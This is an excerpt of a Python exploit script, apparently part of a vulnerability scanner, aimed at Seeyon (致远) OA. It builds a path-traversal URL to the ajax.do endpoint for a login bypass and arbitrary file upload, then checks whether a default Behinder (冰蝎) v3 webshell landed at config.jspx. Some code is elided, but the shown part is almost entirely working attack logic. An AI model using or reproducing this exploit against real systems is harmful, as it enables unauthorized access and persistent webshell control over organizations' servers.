...
def test_webshell(target_url):
    ...
    try:
        ...
        if response.status_code == 200:
            print(Vcolors.RED + "[SUCCESS]  成功上传冰蝎三默认webshell: {}seeyon/apps_res/addressbook/images/config.jspx".format(target_url,target_url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 目标漏洞无法利用, 写入失败" + Vcolors.ENDC)
    except:
        print(Vcolors.WARNING +"[WARNING] 目标漏洞无法利用, 写入失败"+Vcolors.ENDC)


def 致远OA_ajax_登录绕过_任意文件上传(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vuln_url_2 = urldata + "seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    ...
    try:
        ...
        test_webshell(urldata)
    except:
        logging.error("致远OA_ajax_登录绕过_任意文件上传脚本出现异常")
